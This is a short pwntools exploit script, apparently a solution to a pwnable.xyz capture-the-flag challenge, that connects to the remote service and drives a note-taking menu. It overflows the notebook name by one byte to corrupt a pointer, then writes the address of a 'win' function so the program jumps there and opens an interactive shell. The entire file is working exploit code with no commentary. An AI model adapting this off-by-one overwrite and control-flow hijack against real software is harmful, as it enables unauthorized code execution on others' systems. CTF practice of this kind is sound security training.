from pwn import *



def make_note(size, title, note):
    sh.sendlineafter('> ', '1')
    sh.sendlineafter(': ', str(size))
    sh.sendlineafter(': ', title)
    sh.sendlineafter(': ', note)

def delete_note():
    sh.sendlineafter('> ', '3')

def rename_notebook(name):
    sh.sendlineafter('> ', '4')
    sh.sendafter(': ', name)

def edit_note(note):
    sh.sendlineafter('> ', '2')
    sh.sendlineafter(': ', note)

win = 0x40092c

#sh = process("./challenge")
sh = remote('svc.pwnable.xyz',30035)
sh.sendafter(': ', "A"*0x7f + "B")
pause()
make_note(56, "A"*0x1e, p64(win) + "B"*0x2f)
pause()
rename_notebook("A"*0x7f + "\x50")
edit_note("A")
sh.interactive()

